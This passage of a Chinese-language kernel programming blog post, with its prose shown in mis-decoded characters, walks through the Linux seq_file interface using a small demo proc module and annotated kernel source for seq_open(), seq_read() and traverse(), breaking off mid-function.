class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!proc_create_seq(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_seq_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ï¼š</p><p><img src="https://s2.loli.net/2024/06/03/liUg9bKBcz1QqGV.png"></p><h1 id="0x02-åºåˆ—æ–‡ä»¶æ¥å£-å®ç°åŸç†"><a href="#0x02-åºåˆ—æ–‡ä»¶æ¥å£-å®ç°åŸç†" class="headerlink" title="0x02. åºåˆ—æ–‡ä»¶æ¥å£ - å®ç°åŸç†"></a>0x02. åºåˆ—æ–‡ä»¶æ¥å£ - å®ç°åŸç†</h1><p>åºåˆ—æ–‡ä»¶æ¥å£çš„å®ç°å…¶å®å¯ä»¥ç†è§£æˆåœ¨ VFS ä¸Šå¥—äº†ä¸€å±‚é€šç”¨ wrapperï¼Œæ•´ä½“ä¸Šè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæœ¬èŠ‚æˆ‘ä»¬ä» VFS æ–‡ä»¶æ¥å£çš„è°ƒç”¨è·¯å¾„æ¥çœ‹åºåˆ—æ–‡ä»¶æ¥å£æ˜¯å¦‚ä½•å®ç°çš„</p><h2 id="seq-open-ï¼š-åºåˆ—æ–‡ä»¶åˆå§‹åŒ–"><a href="#seq-open-ï¼š-åºåˆ—æ–‡ä»¶åˆå§‹åŒ–" class="headerlink" title="seq_open() ï¼š åºåˆ—æ–‡ä»¶åˆå§‹åŒ–"></a>seq_open() ï¼š åºåˆ—æ–‡ä»¶åˆå§‹åŒ–</h2><p>ä½¿ç”¨åºåˆ—æ–‡ä»¶æ¥å£éœ€è¦åœ¨è‡ªå®šä¹‰çš„ <code>read()</code> å‡½æ•°ä¸­è°ƒç”¨ <code>seq_open()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å…¶å®å°±æ˜¯åˆ†é…ä¸€ä¸ª <code>seq_file</code> ç»“æ„ä½“å­˜æ”¾åˆ° <code>file::private</code> ä¸­ï¼Œå¹¶å»é™¤æ–‡ä»¶å±æ€§ <code>file::f_mode</code> ä¸­çš„ <code>FMODE_PWRITE</code> ä½ï¼ˆå³æ–‡ä»¶å˜å¾—ä¸å¯è¢«ä½¿ç”¨ <code>pwrite()</code> è®¿é—®ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°ä¸ä¼šæ”¹å˜æ–‡ä»¶åç§»ï¼Œå¯¹åºåˆ—æ–‡ä»¶æ¥å£è€Œè¨€å¢åŠ äº†æ“ä½œå¤æ‚æ€§ï¼‰</p><p>ä¸è¿‡æ¯”èµ·ç®€çº¦çš„å‡½æ•°æœ¬èº«ï¼Œæ³¨é‡Šåˆ™è¯¦ç»†åœ°å¯¹åºåˆ—æ–‡ä»¶æ¥å£è¿›è¡Œäº†è¯´æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_open -åˆå§‹åŒ–åºåˆ—æ–‡ä»¶</span><br><span class="hljs-comment"> *@file: æˆ‘ä»¬è¦åˆå§‹åŒ–çš„æ–‡ä»¶</span><br><span class="hljs-comment"> *@op: æè¿°åºåˆ—çš„æ–¹æ³•è¡¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *seq_open() è®¾ç½®äº† @file, å°†å…¶ä¸ä¸€ä¸ªç”± @op æè¿°çš„åºåˆ—è¿›è¡Œå…³è”ã€‚</span><br><span class="hljs-comment"> *@op-&gt;start() å¯åŠ¨äº†è¿­ä»£å™¨å¹¶è¿”å›åºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</span><br><span class="hljs-comment"> *@op-&gt;stop() å°†å…¶åœæ­¢ã€‚  </span><br><span class="hljs-comment"> *@op-&gt;next() è¿”å›åºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚</span><br><span class="hljs-comment"> *@op-&gt;show() å°†å…ƒç´ æ‰“å°åˆ°ç¼“å†²åŒºä¸­ã€‚</span><br><span class="hljs-comment"> *åœ¨å‡ºé”™çš„æƒ…å†µä¸‹ -&gt;start() ä¸ -&gt;next() è¿”å› ERR_PTR(error)ï¼Œ</span><br><span class="hljs-comment"> *  åœ¨åºåˆ—åˆ°è¾¾æœ«å°¾æ—¶è¿”å› NULLã€‚</span><br><span class="hljs-comment"> *-&gt;show() åœ¨æˆåŠŸæ—¶è¿”å› 0,åœ¨å‡ºé”™æ—¶è¿”å›ä¸€ä¸ªè´Ÿæ•°å€¼ï¼Œ</span><br><span class="hljs-comment"> *  è¿”å› SEQ_SKIP è¡¨ç¤º &quot;ä¸¢å¼ƒè¿™ä¸ªå…ƒç´ å¹¶ç»§ç»­ç§»åŠ¨&quot;ã€‚</span><br><span class="hljs-comment"> *æ³¨æ„: seq_open() ä¼šåˆ†é…ä¸€ä¸ª struct seq_file å¹¶å°†å…¶æŒ‡é’ˆ</span><br><span class="hljs-comment"> *å­˜æ”¾åœ¨ @file-&gt;private_dataï¼Œè¿™ä¸ªæŒ‡é’ˆä¸åº”å½“è¢«ä¿®æ”¹ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *op)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">p</span>;</span><br><br>WARN_ON(file-&gt;private_data);<br><br>p = kmem_cache_zalloc(seq_file_cache, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!p)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>file-&gt;private_data = p;<br><br>mutex_init(&amp;p-&gt;lock);<br>p-&gt;op = op;<br><br><span class="hljs-comment">// æ²¡æœ‰å¼•ç”¨è®¡æ•°: &#x27;p&#x27; çš„ç”Ÿå‘½å‘¨æœŸè¢«çº¦æŸåˆ°æ–‡ä»¶çš„ç”Ÿå‘½å‘¨æœŸ</span><br>p-&gt;file = file;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_files æ”¯æŒ lseek() ä¸ pread()ï¼Œä¸”ä¸€ç‚¹ä¹Ÿä¸æ”¯æŒ write()ï¼Œ</span><br><span class="hljs-comment"> * ä½†æˆ‘ä»¬å› ä¸ºä¸€äº›å†å²åŸå› åœ¨è¿™æ¸…é™¤ FMODE_PWRITE here ä½ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥ä¸€ä¸ª seq_files çš„ä½¿ç”¨è€…ï¼š</span><br><span class="hljs-comment"> * a) å®ç°äº† file.write() ä¸” b) æƒ³è¦æ”¯æŒ pwrite()</span><br><span class="hljs-comment"> * ä½¿ç”¨è€…éœ€è¦åœ¨è‡ªå·±çš„ file.open() ä¸­åœ¨è°ƒç”¨ seq_open() åå†è®¾ç½® FMODE_PWRITEã€‚</span><br><span class="hljs-comment"> */</span><br>file-&gt;f_mode &amp;= ~FMODE_PWRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_open);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªæ›´å¸¸ç”¨çš„ wrapper å« <code>__seq_open_private()</code> ï¼Œä¸»è¦å°±æ˜¯å¸®å¼€å‘è€…å¤š kmalloc() ä¸€ä¸ªå†…å­˜å¯¹è±¡æ”¾åˆ° <code>seq_file::private</code> ä¸­ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__seq_open_private(<span class="hljs-keyword">struct</span> file *f, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *ops,<br><span class="hljs-type">int</span> psize)<br>&#123;<br><span class="hljs-type">int</span> rc;<br><span class="hljs-type">void</span> *private;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span>;</span><br><br>private = kzalloc(psize, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (private == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>rc = seq_open(f, ops);<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br><br>seq = f-&gt;private_data;<br>seq-&gt;private = private;<br><span class="hljs-keyword">return</span> private;<br><br>out_free:<br>kfree(private);<br>out:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>EXPORT_SYMBOL(__seq_open_private);<br></code></pre></td></tr></table></figure><h2 id="ï¼ˆâ­æ ¸å¿ƒï¼‰seq-read-ï¼šè¯»å–åºåˆ—æ–‡ä»¶"><a href="#ï¼ˆâ­æ ¸å¿ƒï¼‰seq-read-ï¼šè¯»å–åºåˆ—æ–‡ä»¶" class="headerlink" title="ï¼ˆâ­æ ¸å¿ƒï¼‰seq_read() ï¼šè¯»å–åºåˆ—æ–‡ä»¶"></a>ï¼ˆâ­æ ¸å¿ƒï¼‰seq_read() ï¼šè¯»å–åºåˆ—æ–‡ä»¶</h2><p><code>seq_read()</code> æ˜¯æ­£å¸¸ VFS è·¯å¾„ä¸Š <code>read()</code> ä¼šè°ƒç”¨çš„å‡½æ•°ï¼Œå› ä¸ºå¯¹äºåºåˆ—æ–‡ä»¶æ¥å£è€Œè¨€æˆ‘ä»¬å°†å‡½æ•°è¡¨ä¸­çš„å‡½æ•°æŒ‡é’ˆæŒ‡å®šä¸ºè¯¥å‡½æ•°ï¼Œä¸è¿‡è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯å¯¹ <code>seq_read_iter()</code> çš„åŒ…è£…ï¼Œåœ¨è°ƒç”¨ä¹‹å‰ç®€å•åˆå§‹åŒ–äº†å†™å…¥ç›®æ ‡è®°å½• <code>iovec</code> ä¸æ“ä½œè®°å½•å— <code>kiocb</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_read -åºåˆ—æ–‡ä»¶çš„ -&gt;read() æ–¹æ³•.</span><br><span class="hljs-comment"> *@file: è¦è¯»å–çš„æºæ–‡ä»¶</span><br><span class="hljs-comment"> *@buf: è¦è¯»å…¥çš„ç›®æ ‡ç¼“å†²åŒº</span><br><span class="hljs-comment"> *@size: æœ€å¤§è¯»å–å­—èŠ‚</span><br><span class="hljs-comment"> *@ppos: å½“å‰æ–‡ä»¶ä½ç½®</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;read()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123; .iov_base = buf, .iov_len = size&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br><span class="hljs-type">ssize_t</span> ret;<br><br>init_sync_kiocb(&amp;kiocb, file);<br>iov_iter_init(&amp;iter, ITER_DEST, &amp;iov, <span class="hljs-number">1</span>, size);<br><br>kiocb.ki_pos = *ppos;<br>ret = seq_read_iter(&amp;kiocb, &amp;iter);<br>*ppos = kiocb.ki_pos;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(seq_read);<br></code></pre></td></tr></table></figure><blockquote><p> ä»€ä¹ˆï¼Œä½ è¿˜ä¸çŸ¥é“ iovecã€ kiocbã€iov_iter æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯åœ¨å†…æ ¸ IO ä¸­ç”¨äºå­˜æ”¾æ“ä½œä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå‰è€…æ˜¯åŸºç¡€ç»“æ„ï¼Œåä¸¤è€…ä¸»è¦é…å¯¹ç”¨äºå¼‚æ­¥ IOï¼š</p><ul><li>iovecï¼š<code>io vector</code>ï¼Œè¡¨ç¤ºä¸€å—å¸¦é•¿åº¦çš„ç¼“å†²åŒº</li><li>kiocbï¼š<code>kernel i/o call back</code> ï¼Œè®°å½•æ–‡ä»¶ä¾§ IO ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶æŒ‡é’ˆã€å½“å‰åç§»ç­‰</li><li>iov_iter ï¼š<code>iovec iterator</code> ï¼Œç”¨æ¥æ“ä½œ iovec çš„è¿­ä»£å™¨ï¼Œè®°å½•å†…å­˜ä¾§ IO ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…å­˜åœ°å€ã€å½“å‰åç§»ç­‰</li></ul></blockquote><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ°åºåˆ—æ–‡ä»¶è¯»å–çš„æ ¸å¿ƒå‡½æ•° <code>seq_read_iter()</code> ï¼Œé¦–å…ˆä¼šæ£€æŸ¥æ–‡ä»¶ä¾§åç§»ï¼Œè‹¥æ˜¯ 0 åˆ™å°†åºåˆ—æ–‡ä»¶çš„åºåˆ—å¯¹è±¡åç§»ä¸è¯»å–å­—èŠ‚æ•°ä¹Ÿéƒ½è®¾ä¸º 0ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br><span class="hljs-type">size_t</span> copied = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> n;<br><span class="hljs-type">void</span> *p;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(iter))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>mutex_lock(&amp;m-&gt;lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * if request is to read from zero offset, reset iterator to first</span><br><span class="hljs-comment"> * record as it might have been already advanced by previous requests</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_pos == <span class="hljs-number">0</span>) &#123;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥æ˜¯æ–‡ä»¶ä¾§åç§»ä¸åºåˆ—æ–‡ä»¶è¯»å–åç§»ä¸ç­‰åˆ™è°ƒç”¨ <code>traverse()</code> å‡½æ•°å¤„ç†ï¼Œå¦‚æœå‡ºé”™ç›´æ¥è·³åˆ° <code>Done</code> è¿›è¡Œæ”¶å°¾ï¼Œå¦åˆ™å°†åºåˆ—æ–‡ä»¶åç§»ä¸æ–‡ä»¶åç§»è¿›è¡ŒåŒæ­¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Don&#x27;t assume ki_pos is where we left it */</span><br><span class="hljs-keyword">if</span> (unlikely(iocb-&gt;ki_pos != m-&gt;read_pos)) &#123;<br><span class="hljs-keyword">while</span> ((err = traverse(m, iocb-&gt;ki_pos)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-comment">/* With prejudice... */</span><br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = iocb-&gt;ki_pos;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>traverse()</code> å‡½æ•°æœ‰ç‚¹ç±»ä¼¼ä¸€ä¸ªå°çš„ <code>seq_read_iter()</code> çš„æ ¸å¿ƒï¼Œä½œç”¨å…¶å®æ˜¯ <strong>å°†åºåˆ—æ–‡ä»¶çš„åç§»åŒæ­¥åˆ°æŒ‡å®šçš„åç§»å€¼</strong> ï¼Œè¿™é‡Œæ˜¯<strong>åŒæ­¥åˆ°æ–‡ä»¶ä¾§è®°å½•çš„åç§»</strong> ï¼š</p><ul><li>åˆå§‹åŒ–ä»ç¬¬ä¸€ä¸ªåºåˆ—æ•°æ®å¯¹è±¡å¼€å§‹è¯»å–ï¼Œæ£€æŸ¥åºåˆ—æ–‡ä»¶çš„ä¸´æ—¶ç¼“å†²åŒºæ˜¯å¦åˆ†é…</li><li>è°ƒç”¨ <code>op-&gt;start()</code> åˆå§‹åŒ–åè¿›å…¥è¯»å–å¾ªç¯ï¼š<ul><li>é¦–å…ˆè°ƒç”¨ <code>op-&gt;show()</code> æ‰“å°åˆ°ä¸´æ—¶ç¼“å†²åŒºä¸Š</li><li>è°ƒç”¨ <code>seq_has_overflowed()</code> æ£€æŸ¥ä¸´æ—¶ç¼“å†²åŒºæ˜¯å¦è¯»æ»¡ï¼Œæ»¡åˆ™è·³åˆ° <code>Eoverflow</code> æ ‡ç­¾é‡æ–°åˆ†é…ä¸€å—æ›´å¤§çš„å†…å­˜ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ <code>traverse()</code> çš„ä½œç”¨ä¸»è¦æ˜¯è¿›è¡Œæ­£å¼è¯»å–å‰çš„åç§»åŒæ­¥ï¼Œå› æ­¤ä¸ä¼šä¿å­˜å‰é¢è¯»å–çš„æ•°æ®</li><li>è°ƒç”¨ <code>op-&gt;next()</code> ç§»åŠ¨åˆ°ä¸‹ä¸ªåºåˆ—æ•°æ®å¯¹è±¡ï¼Œè‹¥æœ¬æ¬¡è¶…å‡ºé¢„æœŸåç§»åˆ™å‡å»å¯¹åº”æ•°æ®é‡å¤§å°å¹¶é€€å‡ºå¾ªç¯ï¼Œæ³¨æ„è¿™é‡Œé¢å¤–ç”¨äº†ä¸€ä¸ªå˜é‡ <code>pos</code> è®°å½•è¯»å–çš„æ•°æ®é‡ï¼Œä¸”æ¯æ¬¡å®Œæˆè¯»å–ä¼šæ¸…ç©ºä¸´æ—¶ç¼“å†²åŒºè¯»å–è®¡æ•° <code>m-&gt;count</code> åŠ åˆ° <code>pos</code> ä¸Š</li><li>è‹¥å®Œæˆè¯»å–åˆ°æŒ‡å®šåç§»çš„ä»»åŠ¡åˆ™é€€å‡ºå¾ªç¯</li></ul></li><li>è°ƒç”¨ <code>op-&gt;stop()</code> ç»ˆæ­¢è¯»å–å¹¶è¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">traverse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> offset)</span><br>&#123;<br><span class="hljs-type">loff_t</span> pos = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> *p;<br><br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = m-&gt;from = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!offset)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (p) &#123;<br>error = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (IS_ERR(p))<br><span class="hljs-keyword">break</span>;<br>error = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(error)) &#123;<br>error = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (seq_has_overflowed(m))<br><span class="hljs-keyword">goto</span> Eoverflow;<br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos + m-&gt;count &gt; offset) &#123;<br>m-&gt;from = offset - pos;<br>m-&gt;count -= m-&gt;from;<br><span 